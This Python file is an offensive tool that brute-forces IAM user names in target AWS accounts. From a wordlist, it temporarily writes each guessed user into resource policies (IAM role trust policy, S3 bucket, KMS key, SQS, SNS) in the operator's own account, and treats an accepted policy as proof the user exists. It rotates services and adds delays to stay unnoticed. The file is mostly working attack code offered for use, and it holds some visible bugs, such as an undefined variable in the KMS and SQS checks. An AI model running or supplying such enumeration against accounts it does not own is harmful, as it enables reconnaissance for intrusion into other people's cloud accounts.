"""
Python script to brute force IAM user accounts in target AWS account
"""

import argparse
from asyncio.log import logger
import configparser
import os
import sys
import logging
import json
import random
import copy
import time
from alive_progress import alive_bar

import boto3
from botocore.exceptions import ClientError
from botocore.config import Config

HOME = os.path.expanduser("~")
PWD = os.getcwd()
DELAY = 1
logging.basicConfig(format = "%(asctime)s %(message)s",
                    level=logging.INFO,
                    datefmt = '%Y-%m-%d %H:%M:%S',
                    handlers=[logging.StreamHandler(sys.stdout),
                              logging.FileHandler("aws_user_enum.log")])

ACCOUNT_ID = None
CONFIG = Config(
   retries = {
      'max_attempts': 10,
      'mode': 'adaptive'
   }
)

##############
# Script Setup
##############

def parse_cli_args():
    """
    Process and validate command-line arguments
    """
    global DELAY
    parser = argparse.ArgumentParser(description='AWS IAM User ENumeration using various AWS Services.')
    
    # AWS Credentials Arguments
    parser.add_argument('--credentials_file', default=HOME + '/.aws/credentials', type=str,
                        help=f"Location of AWS Credentials file. Defaults to {HOME + '/.aws/credentials'}")
    parser.add_argument('-p', '--profile', default='default', type=str, help="Specify profile in credentials file to use. Defaults to 'default'.")
    parser.add_argument('--access_key_id', default=None, type=str, help="Specify an AWS Access Key ID")
    parser.add_argument('--secret_access_key', default=None, type=str, help="Specify an AWS Secret Access Key")
    parser.add_argument('--session_token', default=None, type=str, help="Specify a temporary AWS Session Token")
    parser.add_argument('--region', default='us-east-1', type=str, help="Specify the region for test AWS resources.")

    # Script Operations Arguments
    parser.add_argument('--debug', action='store_true', default=False, help=f"Enable debug logging.")
    parser.add_argument('--verbose', action='store_true', default=False, help=f"Report output every step of the way.")
    parser.add_argument('--delay', default=DELAY, type=int, help=f"Set script delay in seconds between policy application attemptes.")
    parser.add_argument('-a', '--accounts', nargs='*', help="Target AWS Accounts to brute force.")
    parser.add_argument('-w', '--wordlist', default=None, type=str, required=True, help=f"Username wordlist with one user per line.")
    parser.add_argument('--shuffle', action='store_true', default=False, help=f"Shuffle the provided wordlist.")
    parser.add_argument('--services', nargs='*', default=['kms', 's3', 'sqs', 'iam', 'sns'], help="Specify which service to test with. \
                                                      'all' will use all supported services. [IAM, S3, KMS, SQS, SNS]")
    parser.add_argument('--save_services', action='store_true', default=False, help=f"Do not remove AWS services when finished.")
    parser.add_argument('--iam_role', default=None, type=str, help=f"IAM Role to use during testing.")
    parser.add_argument('--s3_bucket', default=None, type=str, help=f"S3 Bucket to use during testing.")
    parser.add_argument('--kms_key', default=None, type=str, help=f"KMS Key ID to use during testing.")
    parser.add_argument('--kms_alias', default=None, type=str, help=f"KMS Key alias to use during testing.")
    parser.add_argument('--sqs', default=None, type=str, help=f"SQS to use during testing.")
    parser.add_argument('--sns', default=None, type=str, help=f"SNS Trail to use during testing.")
    
    arrrrrgs = parser.parse_args()

    # Validate Credential File Information if access keys aren't provided
    if not (arrrrrgs.access_key_id or arrrrrgs.secret_access_key):
        if '~' in arrrrrgs.credentials_file:
            arrrrrgs.credentials_file = HOME + '/.aws/credentials'
        if not os.path.isfile(arrrrrgs.credentials_file):
            logging.error(f"{arrrrrgs.credentials_file} does not exist.")
            sys.exit()
        if not os.access(arrrrrgs.credentials_file, os.R_OK):
            logging.error(f"{arrrrrgs.credentials_file} is not able to be read.")
            sys.exit()

    # Read existing config file, if one exists
    config = configparser.ConfigParser()
    config.read(arrrrrgs.credentials_file)

    if not arrrrrgs.access_key_id:
        arrrrrgs.access_key_id     = config[arrrrrgs.profile]['aws_access_key_id']
    if not arrrrrgs.secret_access_key:
        arrrrrgs.secret_access_key = config[arrrrrgs.profile]['aws_secret_access_key']
    if not arrrrrgs.session_token and 'aws_session_token' in config[arrrrrgs.profile]:
        arrrrrgs.aws_session_token = config[arrrrrgs.profile]['aws_session_token']

    if not arrrrrgs.region and 'region' in config[arrrrrgs.profile]:
        arrrrrgs.region = sorted([config[arrrrrgs.profile]['region']])

    default_services = ['kms', 's3', 'sqs', 'iam', 'sns']
    if any([a for a in arrrrrgs.services if a.lower() == 'all']):
        arrrrrgs.services = default_services
    elif arrrrrgs.services:
        services = [a for b in arrrrrgs.services for a in b.split(',')]
        services = [a for b in services for a in b.split()]
        arrrrrgs.services = sorted(list(set((services))))
        for service in arrrrrgs.services:
            if service.lower() not in default_services:
                logger.info(f'[!] Removing {service} as it is not a valid option.')
                arrrrrgs.services.remove(service)
        if not arrrrrgs.services:
            logger.error(f'[!] No valid services provided.')
            sys.exit()
    else:
        arrrrrgs.services = default_services

    accounts = [a for b in arrrrrgs.accounts for a in b.split(',')]
    arrrrrgs.accounts = [a for b in accounts for a in b.split()]

    if arrrrrgs.delay:
        DELAY = arrrrrgs.delay

    if arrrrrgs.debug:
        logging.getLogger().setLevel(logging.DEBUG)

    return arrrrrgs


def boto_session_setup():
    """
    1. Create session for boto to work off of
    2. Validate legitimate access
    """

    session_details = {
        "aws_access_key_id":     ARGS.access_key_id,
        "aws_secret_access_key": ARGS.secret_access_key,
        "region_name":           'us-east-1'
    }
    if 'security_token' in ARGS and ARGS.security_token:
        session_details["aws_security_token"] = ARGS.aws_security_token
    if 'session_token' in ARGS and ARGS.session_token:
        session_details["aws_session_token"] = ARGS.aws_session_token

    enum_session = boto3.session.Session(**session_details)

    global STS_SESSION
    global ACCOUNT_ID
    STS_SESSION = enum_session.client('sts')
    try:
        ACCOUNT_ID = STS_SESSION.get_caller_identity().get("Account", "_PLACEHOLDER")
        if ARGS.verbose:
            logging.info(f"[+] Validated BOTO3 Session for Account #{ACCOUNT_ID}")
    except ClientError as error:
        logging.error(error)
        sys.exit()

    # Validate region now that session is verified
    ec2_session = enum_session.client('ec2')
    all_regions = ec2_session.describe_regions()['Regions']
    all_regions = sorted([a['RegionName'] for a in all_regions])
    while ARGS.region not in all_regions:
        logging.error(f"[!] {ARGS.region} is not a valid region. Region List: {all_regions}")
        response = input("Specify which region to use: ")
        if response.lower() in all_regions:
            ARGS.region = response.lower()
    
    return enum_session

##################
# Script Functions
##################

def service_setup(session):
    '''
    Setup services in account we own for testing
    '''
    
    service_data = {}
    if 'all-services' in ARGS.services or 'iam' in (a.lower() for a in ARGS.services):
        result = iam_prep(session)
        if result:
            service_data['iam'] = result
        else:
            ARGS.services.remove('iam')
    if 'all-services' in ARGS.services or 's3' in (a.lower() for a in ARGS.services):
        result = s3_prep(session)
        if result:
            service_data['s3'] = result
        else:
            ARGS.services.remove('s3')
    if 'all-services' in ARGS.services or 'kms' in (a.lower() for a in ARGS.services):
        result = kms_prep(session)
        if result:
            service_data['kms'] = result
        else:
            ARGS.services.remove('kms')
    if 'all-services' in ARGS.services or 'sqs' in (a.lower() for a in ARGS.services):
        result = sqs_prep(session)
        if result:
            service_data['sqs'] = result
        else:
            ARGS.services.remove('sqs')
    if 'all-services' in ARGS.services or 'sns' in (a.lower() for a in ARGS.services):
        result = sns_prep(session)
        if result:
            service_data['sns'] = result
        else:
            ARGS.services.remove('sns')
    
    return service_data


def iam_prep(session):
    """
    Check IAM Role or create one if needed
    """
    global IAM_SESSION
    IAM_SESSION = session.client('iam')

    # Validate and use provided IAM Role
    if ARGS.iam_role:
        try:
            response = IAM_SESSION.get_role(RoleName=ARGS.iam_role)
            return response['Role']['Arn']
        except ClientError:
            logger.info(f"[!] IAM Role {ARGS.iam_role} not found.")

    # Check if default IAM Role exists
    try:
        response = IAM_SESSION.get_role(RoleName="aws_user_enum_script")
        return response['Role']['Arn']
    except ClientError:
        logger.info(f"[!] IAM Role default 'aws_user_enum_script' not found.")
    
    # No IAM Role found. Create one?
    response = input(f"[!] No usable IAM Role found. Do you want to create a new IAM Role (Y/N)? ")
    if response[0].lower() == 'y':
        try:
            assume_role_policy = json.dumps({
                "Version": "2012-10-17",
                "Statement": [{ "Effect": "Allow",
                                "Principal": {"AWS": f"{STS_SESSION.get_caller_identity()['Arn']}"},
                                "Action": "sts:AssumeRole"}]})
            response = IAM_SESSION.create_role(RoleName="aws_user_enum_script",
                                               Description=f"Created by {STS_SESSION.get_caller_identity()['UserId']}",
                                               AssumeRolePolicyDocument=assume_role_policy)
            return response['Role']['Arn']
        except ClientError as error:
            logger.exception(error)

    return None


def s3_prep(session):
    """
    Check S3 Bucket or create one if needed
    """
    global S3_SESSION
    S3_SESSION = session.client('s3')

    # Validate and use provided S3 Bucket
    if ARGS.s3_bucket:
        try:
            response = S3_SESSION.get_bucket_location(Bucket=ARGS.s3_bucket)
            return f"arn:aws:s3:::{ARGS.s3_bucket}"
        except ClientError:
            logger.info(f"[!] S3 Bucket {ARGS.s3_bucket} not found.")

    # Check if default S3 Bucket exists
    try:
        response = S3_SESSION.get_bucket_location(Bucket=f"{ACCOUNT_ID}-aws-user-enum-script")
        return f"arn:aws:s3:::{ACCOUNT_ID}-aws-user-enum-script"
    except ClientError:
        logger.info(f"[!] Default S3 Bucket {ACCOUNT_ID}-aws-user-enum-script not found.")

    # No S3 Bucket found. Create one?
    response = input(f"[!] No usable S3 Bucket found. Do you want to create a new S3 Bucket (Y/N)? ")
    if response[0].lower() == 'y':
        try:
            response = S3_SESSION.create_bucket(Bucket=f"{ACCOUNT_ID}-aws-user-enum-script")
            S3_SESSION.put_bucket_tagging(
                Bucket=f"{ACCOUNT_ID}-aws-user-enum-script",
                Tagging={'TagSet':[{'Key': 'Name', 'Value': 'aws_user_enum_script'},
                                   {'Key': 'Created_by', 'Value': STS_SESSION.get_caller_identity()['UserId']}]})
            return f"arn:aws:s3:::{response['Location'][1:]}"
        except ClientError as error:
            logger.exception(error)
        pass
    
    return None


def kms_prep(session):
    """
    Check KMS Key details or create one if needed
    """
    global KMS_SESSION
    KMS_SESSION = session.client('kms')

    # Validate and use provided KMS Key ID 
    if ARGS.kms_key:
        try:
            response = KMS_SESSION.describe_key(KeyId = ARGS.kms_key)
            kms_key_id = kms_key[0]['TargetKeyId']
            response = KMS_SESSION.describe_key(KeyId=kms_key_id)
            if response['KeyMetadata']['Enabled']:
                return kms_key_id
        except ClientError:
            logger.info(f"[!] KMS Key ID {ARGS.kms_key} not found.")

    # Validate and use provided KMS Alias
    if ARGS.kms_alias:
        try:
            paginator = KMS_SESSION.get_paginator('list_aliases')
            response_iter = paginator.paginate()
            alias = ARGS.kms_alias
            if not ARGS.kms_alias.startswith('alias/'):
                alias = 'alias/' + ARGS.kms_alias
            for resp in response_iter:
                kms_key = [a for a in resp['Aliases'] if a['AliasName'] == f'{alias}']
                if kms_key:
                    kms_key_id = kms_key[0]['TargetKeyId']
                    response = KMS_SESSION.describe_key(KeyId=kms_key_id)
                    if response['KeyMetadata']['Enabled']:
                        return kms_key_id
            logger.info(f"[!] KMS Key Alias '{ARGS.kms_alias}' not found.")
        except ClientError as error:
            logger.exception(error)

    # Check if default KMS Alias exists
    try:
        paginator = KMS_SESSION.get_paginator('list_aliases')
        response_iter = paginator.paginate()
        alias = 'alias/aws_user_enum_script'
        for resp in response_iter:
            kms_key = [a for a in resp['Aliases'] if a['AliasName'] == f'{alias}']
            if kms_key:
                kms_key_id = kms_key[0]['TargetKeyId']
                response = KMS_SESSION.describe_key(KeyId=kms_key_id)
                if response['KeyMetadata']['Enabled']:
                    return kms_key_id
        logger.info(f"[!] Default KMS Key Alias not found.")
    except ClientError as error:
        logger.exception(error)

    # No KMS key found. Create one?
    response = input(f"[!] No usable KMS Key found. Do you want to create a new KMS Key (Y/N)? ")
    if response[0].lower() == 'y':
        try:
            response = KMS_SESSION.create_key(
                Description = 'aws_user_enum_script KMS key for user enumeration in a different account',
                Tags = [{'TagKey': 'Name', 'TagValue': 'aws_user_enum_script'},
                        {'TagKey': 'Created_by', 'TagValue': STS_SESSION.get_caller_identity()['UserId']}]
            )
            KMS_SESSION.create_alias(
                AliasName='alias/aws_user_enum_script',
                TargetKeyId=response['KeyMetadata']['KeyId']
            )
            logger.info(f"[+] KMS Key '{response['KeyMetadata']['KeyId']}' with alias 'alias/aws_user_enum_script' created")
            kms_key_id = response['KeyMetadata']['KeyId']
            return kms_key_id
        except ClientError as error:
            logger.exception(error)
    else:
        logger.info(f"[+] No KMS Key created. Skipping KMS checks.")
        
    return False


def sqs_prep(session):
    """
    Check SQS or create one if needed
    """
    global SQS_SESSION
    SQS_SESSION = session.client('sqs')

    # Validate and use provided SQS
    if ARGS.sqs:
        try:
            response = SQS_SESSION.get_queue_url(QueueName=ARGS.sqs)
            return response['QueueUrl']
        except ClientError:
            logger.info(f"[!] SQS {ARGS.sqs} not found.")
    
    # Check if default SQS exists
    try:
        response = SQS_SESSION.get_queue_url(QueueName="aws_user_enum_script")
        return response['QueueUrl']
    except ClientError:
        logger.info(f"[!] SQS default 'aws_user_enum_script' not found.")
    
    # No SQS found. Create one?
    response = input(f"[!] No usable SQS found. Do you want to create a new SQS (Y/N)? ")
    if response[0].lower() == 'y':
        try:
            response = SQS_SESSION.create_queue(QueueName="aws_user_enum_script",
                                                tags={'Created_by': STS_SESSION.get_caller_identity()['UserId']})
            return response['QueueUrl']
        except ClientError as error:
            logger.exception(error)
    
    return None


def sns_prep(session):
    """
    Check SNS or create one if needed
    """

    global SNS_SESSION
    SNS_SESSION = session.client('sns')

    # Validate and use provided SNS Topic
    if ARGS.sns:
        try:
            topic_arn = f"arn:aws:sns:{session.region_name}:{ACCOUNT_ID}:{ARGS.sns}"
            response = SNS_SESSION.get_topic_attributes(TopicArn=topic_arn)
            return topic_arn
        except ClientError:
            logger.info(f"[!] SNS Topic {ARGS.sns} not found.")

    # Check if default SNS Topic exists
    try:
        topic_arn = f"arn:aws:sns:{session.region_name}:{ACCOUNT_ID}:aws_user_enum_script"
        SNS_SESSION.get_topic_attributes(TopicArn=topic_arn)
        return topic_arn
    except ClientError:
        logger.info(f"[!] SNS Topic default 'aws_user_enum_script' not found.")

    # No SNS Topic found. Create one?
    response = input(f"[!] No usable SNS Topic found. Do you want to create a new SNS Topic (Y/N)? ")
    if response[0].lower() == 'y':
        try:
            response = SNS_SESSION.create_topic(Name="aws_user_enum_script",
                                                Tags=[{'Key': 'Created_by', 
                                                       'Value': STS_SESSION.get_caller_identity()['UserId']}])
            return response['TopicArn']
        except ClientError as error:
            logger.exception(error)


def brute_enum_services(service_data):
    """
    Brute Force each service for user enumeration
    """

    valid_users = []
    if not service_data:
        return False
    
    # Read in Wordlist
    userlist = []
    with open(ARGS.wordlist) as f:
        userlist = f.read().splitlines()

    if ARGS.shuffle:
        random.shuffle(userlist)

    # Brute Force Usernames using AWS Resources
    last_service = ''
    acct_count = 0
    for account in ARGS.accounts:
        acct_count = acct_count + 1
        with alive_bar(len(userlist), title=f"[{acct_count}/{len(ARGS.accounts)}] ", ) as prog_bar:
            for user in userlist:
                prog_bar()
                service = random.choice(ARGS.services)
                while service == last_service:
                    service = random.choice(ARGS.services)
                last_service == service

                if service == "iam":
                    if check_iam(service_data[service], account, user):
                        valid_users.append(f"{account}/{user}")
                        logger.info(f"[+] {account}/{user}")

                if service == "s3":
                    if check_s3(service_data[service], account, user):
                        valid_users.append(f"{account}/{user}")
                        logger.info(f"[+] {account}/{user}")

                if service == "kms":
                    if check_kms(service_data[service], account, user):
                        valid_users.append(f"{account}/{user}")
                        logger.info(f"[+] {account}/{user}")

                if service == "sqs":
                    if check_sqs(service_data[service], account, user):
                        valid_users.append(f"{account}/{user}")
                        logger.info(f"[+] {account}/{user}")

                if service == "sns":
                    if check_sns(service_data[service], account, user):
                        valid_users.append(f"{account}/{user}")
                        logger.info(f"[+] {account}/{user}")

                # Sleep for delay time so we don't spam.
                time.sleep(int(DELAY))

    return


def check_iam(service, account, user):
    """
    Update IAM Assume Role policy to see if user in remote account can be added to policy. 
    Success means the user exists while failure means they do not.
    """
    try:
        role_name = service.split('/')[1]
        arn_update = f"arn:aws:iam::{account}:user/{user}"
        test_policy_statement = { "Effect": "Deny",
                                  "Principal": {"AWS": arn_update},
                                  "Action": "sts:AssumeRole" }

        response = IAM_SESSION.get_role(RoleName=role_name)
        
        orig_assume_policy = response['Role']['AssumeRolePolicyDocument']
        update_assume_policy = copy.deepcopy(orig_assume_policy)
        update_assume_policy['Statement'].append(test_policy_statement)

        response = IAM_SESSION.update_assume_role_policy(RoleName=role_name, PolicyDocument=json.dumps(update_assume_policy))

        # Reset policy to orginal
        response = IAM_SESSION.update_assume_role_policy(RoleName=role_name, PolicyDocument=json.dumps(orig_assume_policy))

        return True
    except ClientError as error:
        if ARGS.verbose:
            logger.info(f"[!] Invalid Principal {account}/{user}")
        logger.debug(error)

    return False


def check_s3(service, account, user):
    """
    Update S3 Bucket Poicy to see if user in remote account can be added to policy.
    Success means the user exists while failure means they do not.
    """
    try:
        bucket = service.split(':')[-1]
        arn_update = f"arn:aws:iam::{account}:user/{user}"
        test_policy_statement = { "Sid": "aws user enum test",
                                  "Effect": "Allow",
                                  "Principal": {"AWS": arn_update},
                                  "Action": ["s3:*"],
                                  "Resource": [f"arn:aws:s3:::{ARGS.s3_bucket}/*"] }

        response = S3_SESSION.get_bucket_policy(Bucket=bucket)
        
        orig_bucket_policy = json.loads(response['Policy'])
        update_assume_policy = copy.deepcopy(orig_bucket_policy)
        update_assume_policy['Statement'].append(test_policy_statement)

        response = S3_SESSION.put_bucket_policy(Bucket=bucket, Policy=json.dumps(update_assume_policy))

        # Reset policy to orginal
        response = S3_SESSION.put_bucket_policy(Bucket=bucket, Policy=json.dumps(orig_bucket_policy))

        return True
    
    except ClientError as error:
        # Reports error if no bucket policy has been defined
        try:
            if error.response['Error']['Code'] == 'NoSuchBucketPolicy':
                bucket = service.split(':')[-1]
                arn_update = f"arn:aws:iam::{account}:user/{user}"
                test_policy_statement = { "Sid": "aws user enum test",
                                        "Effect": "Allow",
                                        "Principal": {"AWS": arn_update},
                                        "Action": ["s3:*"],
                                        "Resource": [f"arn:aws:s3:::{ARGS.s3_bucket}/*"] }
                bucket_policy = { "Version": "2012-10-17", "Statement": [ test_policy_statement ] }
                
                response = S3_SESSION.put_bucket_policy(Bucket=bucket, Policy=json.dumps(bucket_policy))

                # Reset policy to orginal
                response = S3_SESSION.delete_bucket_policy(Bucket=bucket)

                return True
            else:
                logger.debug(error)
        except ClientError as error:
            if ARGS.verbose:
                logger.info(f"[!] Invalid Principal {account}/{user}")
            logger.debug(error)

    return False


def check_kms(service, account, user):
    """
    Update KMS Policy to see if user in remote account can be added to policy.
    Success means the user exists while failure means they do not. 
    """
    try:
        arn_update = f"arn:aws:iam::{account}:user/{user}"
        test_policy_statement = { "Effect": "Allow",
                                  "Principal": {"AWS": arn_update},
                                  "Action": "kms:*",
                                  "Resource": "*" }
        
        response = KMS_SESSION.get_key_policy(KeyId=service,
                                              PolicyName='default')

        orig_policy = json.loads(response['Policy'])
        update_policy = copy.deepcopy(orig_policy)
        update_policy['Statement'].append(test_policy_statement)

        KMS_SESSION.put_key_policy(KeyId=service, Policy=json.dumps(update_policy), PolicyName='default')

        # Reset policy to original
        KMS_SESSION.put_key_policy(KeyId=service, Policy=json.dumps(orig_policy), PolicyName='default')
        
        return True
    
    except ClientError as error:
        if ARGS.verbose:
            logger.info(f"[!] Invalid Principal {account}/{user}")
        logger.debug(error)


def check_sqs(service, account, user):
    """ 
    Update SQS policy to see if user in remote account can be added to policy.
    Success means the user exists while failure means they do not.
    """

    try:
        queue_arn = f"arn:aws:sqs:{session.region_name}:{ACCOUNT_ID}:{service.split('/')[-1]}"
        arn_update = f"arn:aws:iam::{account}:user/{user}"
        test_policy_statement = { "Effect": "Allow",
                                  "Principal": {"AWS": arn_update},
                                  "Action": "sqs:GetQueueUrl",
                                  "Resource": queue_arn }

        response = SQS_SESSION.get_queue_attributes(QueueUrl=service, AttributeNames=['Policy'])
        
        if 'Attributes' in response and 'Policy' in response['Attributes']:
            # If previous policy existed
            orig_assume_policy = json.loads(response['Attributes']['Policy'])
            update_assume_policy = copy.deepcopy(orig_assume_policy)
            update_assume_policy['Statement'].append(test_policy_statement)
            print(orig_assume_policy)
            print(json.dumps(orig_assume_policy))

            response = SQS_SESSION.set_queue_attributes(QueueUrl=service, Attributes={'Policy': json.dumps(update_assume_policy)})

            # Reset policy to original
            response = SQS_SESSION.set_queue_attributes(QueueUrl=service, Attributes={'Policy': json.dumps(orig_assume_policy)})

            return True

        else:
            # If no policy existed
            test_policy = { "Version": "2012-10-17", "Id": "Queue1_Policy_UUID", "Statement": [ test_policy_statement ]}

            response = SQS_SESSION.set_queue_attributes(QueueUrl=service, 
                                                        Attributes={'Policy': json.dumps(test_policy)})

            # Remove policy
            response = SQS_SESSION.set_queue_attributes(QueueUrl=service, Attributes={'Policy': ''})

            return True

    except ClientError as error:
        if ARGS.verbose:
            logger.info(f"[!] Invalid Principal {account}/{user}")
        logger.debug(error)

    return False


def check_sns(service, account, user):
    """
    Update SNS policy to see if user in remote account can be added to policy.
    Success means the user exists while failure means they do not.
    """

    try:
        arn_update = f"arn:aws:iam::{account}:user/{user}"
        test_policy_statement = { "Effect": "Allow",
                                  "Principal": {"AWS": arn_update},
                                  "Action": "SNS:GetTopicAttributes",
                                  "Resource": service }

        response = SNS_SESSION.get_topic_attributes(TopicArn=service)

        orig_assume_policy = json.loads(response['Attributes']['Policy'])
        update_assume_policy = copy.deepcopy(orig_assume_policy)
        update_assume_policy['Statement'].append(test_policy_statement)

        response = SNS_SESSION.set_topic_attributes(TopicArn=service, AttributeName='Policy', AttributeValue=json.dumps(update_assume_policy))

        response = SNS_SESSION.set_topic_attributes(TopicArn=service, AttributeName='Policy', AttributeValue=json.dumps(orig_assume_policy))

        return True

    except ClientError as error:
        if ARGS.verbose:
            logger.info(f"[!] Invalid Principal {account}/{user}")
        logger.debug(error)

    return False


def remove_services(service_data):
    """
    Remove each service used for enumeration, if told to
    """

    if not ARGS.save_services:
        logger.info("[+] Removing AWS Services used for testing.")
        try:
            role_name = service_data['iam'].split('/')[-1]
            IAM_SESSION.delete_role(RoleName=role_name)
        except ClientError as error:
            logger.exception(error)

        try:
            bucket = service_data['s3'].split(':')[-1]
            S3_SESSION.delete_bucket(Bucket=bucket)
        except ClientError as error:
            logger.exception(error)

        try:
            KMS_SESSION.disable_key(KeyId=service_data['kms'])
            key_alias = KMS_SESSION.list_aliases(KeyId=service_data['kms'])['Aliases'][0]['AliasName']
            KMS_SESSION.delete_alias(AliasName=key_alias)
            KMS_SESSION.schedule_key_deletion(KeyId=service_data['kms'], PendingWindowInDays=7)
        except ClientError as error:
            logger.exception(error)

        try:
            SQS_SESSION.delete_queue(QueueUrl=service_data['sqs'])
        except ClientError as error:
            logger.exception(error)

        try:
            SNS_SESSION.delete_topic(TopicArn=service_data['sns'])
        except ClientError as error:
            logger.exception(error)


###############
# Main Function
###############

if __name__ == '__main__':
    # Process CLI Arguments
    ARGS = parse_cli_args()

    # Report Details
    logger.info(f"[+] Target Accounts: {', '.join(ARGS.accounts)}")
    logger.info(f"[+] Test Services:   {', '.join(ARGS.services)}")
    logger.info(f"[+] Username List:   {ARGS.wordlist}")

    # Setup and validate session to work from
    session = boto_session_setup()

    # Setup services if they don't already exist
    service_data = service_setup(session)

    # Brute force IAM users by cycling tests from each service
    brute_enum_services(service_data)

    # Remove Services
    remove_services(service_data)

    logger.info("[+] Script Finished.")